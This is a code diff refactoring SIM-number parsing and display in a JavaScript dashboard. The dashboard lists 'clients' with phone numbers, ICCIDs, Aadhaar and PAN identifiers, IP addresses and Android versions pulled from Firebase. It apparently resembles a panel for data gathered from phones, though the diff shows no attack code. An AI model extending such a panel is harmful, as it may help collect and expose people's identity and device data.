@@ -23,9 +23,11 @@ import {
 } from "./schemes.js";
 import { databaseReadUrl, shallowReadUrl } from "./lib/firebase-rest.js";
 import {
+  carrierNamesForClient,
   firstSimMobile,
   hasClientRecords,
   mergeClientProfile,
+  normalizeClientSims,
   phoneNumbersForClient,
   providerForClient,
   simCountForClient,
@@ -467,15 +469,7 @@ function getProviderLabel(client) {
   return providerForClient(client);
 }
 function getCarriers(client) {
-  if (!client || !Array.isArray(client.sims)) return [];
-  const out = [];
-  return (
-    client.sims.forEach((s) => {
-      const c = s && s.carrierName ? String(s.carrierName).trim() : "";
-      c && c.toLowerCase() !== "unknown" && !out.includes(c) && out.push(c);
-    }),
-    out
-  );
+  return carrierNamesForClient(client);
 }
 function getSimBadge(client) {
   const n = getSimCount(client),
@@ -697,32 +691,6 @@ function parseDeviceInfoString(s) {
   });
   return out;
 }
-function simsFromInlineFields(raw) {
-  const sims = [];
-  for (let i = 1; i <= 4; i++) {
-    const num = raw["numberSim" + i],
-      name = raw["nameSim" + i],
-      type = raw["typeSim" + i],
-      icc = raw["iccIdSim" + i];
-    if (num == null && name == null) continue;
-    const numStr = num == null ? "" : String(num).trim(),
-      nameStr = name == null ? "" : String(name).trim(),
-      typeStr = type == null ? "" : String(type).trim();
-    const dead = (v) =>
-      !v || /^(no sim found|no data|not available|unknown|none|-)$/i.test(v);
-    if (dead(numStr) && dead(nameStr)) continue;
-    const digits = numStr.replace(/\D/g, ""),
-      phone = digits.length >= 10 ? digits.slice(-10) : "";
-    sims.push({
-      phoneNumber: phone || void 0,
-      carrierName: dead(nameStr) ? void 0 : nameStr,
-      slot: i,
-      simType: dead(typeStr) ? void 0 : typeStr,
-      iccid: icc && !dead(String(icc)) ? String(icc).trim() : void 0,
-    });
-  }
-  return sims;
-}
 function normalizeClient(raw, sim) {
   if (!raw || typeof raw != "object") return null;
   raw = mergeClientProfile(raw);
@@ -791,84 +759,8 @@ function normalizeClient(raw, sim) {
     ]);
     s !== void 0 && (c.status = toBoolStatus(s));
   }
-  if (!Array.isArray(c.sims) && sim && typeof sim == "object") {
-    const sims = [];
-    (["sim1", "sim2", "sim3", "sim4", "Sim1", "Sim2", "Sim3", "Sim4"].forEach(
-      (sk) => {
-        const v = sim[sk];
-        if (!v) return;
-        const s = String(v),
-          m = s.match(/(\+?\d{10,13})\b/);
-        if (!m) return;
-        const d10 = m[1].replace(/\D/g, "").slice(-10);
-        d10.length !== 10 ||
-          !"6789".includes(d10[0]) ||
-          (sims.some((x) => x.phoneNumber === d10) ||
-            sims.push({
-              phoneNumber: d10,
-              carrierName:
-                (s.split(/\s*[\u2014\u2013-]\s*/).pop() || "").trim() || void 0,
-              slot: parseInt(String(sk).replace(/\D/g, ""), 10) || void 0,
-            }),
-          String(v).trim().toLowerCase() === "yes" && (c.dualSim = !0));
-      },
-    ),
-      String(sim.dualSim || sim.dualsim || "")
-        .trim()
-        .toLowerCase() === "yes" && (c.dualSim = !0),
-      sims.length && (c.sims = sims));
-  }
-  if (!Array.isArray(c.sims)) {
-    const inline = simsFromInlineFields(raw);
-    inline.length && (c.sims = inline);
-  }
-  if (!Array.isArray(c.sims)) {
-    const sims = [];
-    for (let i = 1; i <= 4; i++) {
-      const s = raw["Sim" + i];
-      if (s != null) {
-        if (typeof s == "string")
-          s.trim() &&
-            s.trim() !== "Unknown" &&
-            sims.push({ phoneNumber: s.trim() });
-        else if (typeof s == "object") {
-          const num = firstOf(s, [
-            "phoneNumber",
-            "number",
-            "phone",
-            "msisdn",
-            "mobNo",
-          ]);
-          num &&
-            String(num).trim() &&
-            String(num).trim() !== "Unknown" &&
-            sims.push({
-              phoneNumber: String(num).trim(),
-              carrierName:
-                firstOf(s, ["carrierName", "carrier", "operator", "network"]) ||
-                void 0,
-            });
-        }
-      }
-    }
-    (Object.keys(raw).forEach((k) => {
-      if (!/^sim[_-]?\d+$/i.test(k)) return;
-      const s = raw[k];
-      if (typeof s == "string" && s.trim() && s.trim() !== "Unknown")
-        sims.some((x) => x.phoneNumber === s.trim()) ||
-          sims.push({ phoneNumber: s.trim() });
-      else if (s && typeof s == "object") {
-        const num = firstOf(s, ["phoneNumber", "number", "phone", "msisdn"]);
-        num &&
-          !sims.some((x) => x.phoneNumber === String(num).trim()) &&
-          sims.push({
-            phoneNumber: String(num).trim(),
-            carrierName: firstOf(s, ["carrierName", "carrier", "operator"]),
-          });
-      }
-    }),
-      sims.length && (c.sims = sims));
-  }
+  const normalizedSims = normalizeClientSims(raw, sim);
+  c.sims = normalizedSims;
   if (!c.mobNo) {
     const m = firstOf(raw, [
       "phoneNumber",
@@ -877,21 +769,35 @@ function normalizeClient(raw, sim) {
       "msisdn",
       "mobile",
       "mob_no",
+      "phone_number",
+      "contactNumber",
       "Number",
       "Mobile",
     ]);
-    m && (c.mobNo = String(m).trim());
+    (typeof m === "string" || typeof m === "number") &&
+      String(m).trim() &&
+      (c.mobNo = String(m).trim());
   }
+  const primaryMobile =
+    typeof c.mobNo === "string" || typeof c.mobNo === "number"
+      ? String(c.mobNo).trim()
+      : "";
+  if (primaryMobile.replace(/\D/g, "").length >= 10) {
+    const primarySim = c.sims.find((entry) => !entry.phoneNumber);
+    if (primarySim) primarySim.phoneNumber = primaryMobile;
+    else if (!c.sims.length) c.sims = [{ phoneNumber: primaryMobile, slot: 1 }];
+  }
+  const explicitDualSim =
+    firstOf(raw, ["dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM"]) ??
+    firstOf(sim && typeof sim === "object" ? sim : {}, [
+      "dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM",
+    ]);
+  if (c.dualSim === void 0 && explicitDualSim !== void 0) {
+    c.dualSim = toBoolStatus(explicitDualSim);
+  }
+  if (c.dualSim === void 0 && c.sims.length > 1) c.dualSim = !0;
   if (
-    (c.dualSim === void 0 &&
-      (c.dualSim = toBoolStatus(
-        firstOf(raw, ["dualSim", "dualsim", "isDualSim", "DualSim"]),
-      )),
-    c.dualSim === void 0 &&
-      Array.isArray(c.sims) &&
-      c.sims.length > 1 &&
-      (c.dualSim = !0),
-    c.person || (c.person = firstOf(raw, ["Name", "name"])),
+    (c.person || (c.person = firstOf(raw, ["Name", "name"])),
     c.aadhaar || (c.aadhaar = firstOf(raw, ["Aadhaar", "aadhaar", "aadhar"])),
     c.panCard ||
       (c.panCard = firstOf(raw, ["PanCard", "pancard", "pan", "PAN"])),
@@ -903,13 +809,17 @@ function normalizeClient(raw, sim) {
       "operator",
       "network",
       "provider",
+      "serviceProvider",
       "simOperator",
+      "networkOperator",
     ]);
     p && (c.service_provider = String(p).trim());
   }
   if (
     (c.ip_address ||
-      (c.ip_address = firstOf(raw, ["ip", "ipAddress", "last_ip"])),
+      (c.ip_address = firstOf(raw, [
+        "ip", "IP", "ipAddress", "ip_address", "IP_Address", "last_ip", "lastIp",
+      ]) || firstOf(dinfo, ["ip", "ipAddress", "ip_address", "IP_Address"])),
     c.androidV ||
       (c.androidV = firstOf(raw, [
         "androidVersion",
@@ -2337,10 +2247,20 @@ function generateClientsView(clientsNode) {
         phoneNumbers = getPhoneNumbers(item),
         phoneDisplay = phoneNumbers
           ? phoneNumbers
-              .map(
-                (n, i) =>
-                  `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${i + 1}: ${n}</span>`,
-              )
+              .map((n, i) => {
+                const digits = String(n).replace(/\D/g, "").slice(-10),
+                  matchingSim = Array.isArray(item.sims)
+                    ? item.sims.find(
+                        (sim) =>
+                          sim &&
+                          String(sim.phoneNumber || sim.number || sim.phone || "")
+                            .replace(/\D/g, "")
+                            .slice(-10) === digits,
+                      )
+                    : null,
+                  slot = matchingSim && matchingSim.slot ? matchingSim.slot : i + 1;
+                return `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${slot}: ${n}</span>`;
+              })
               .join(" ")
           : '<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📱 —</span>',
         providerDisplay = getProviderLabel(item),
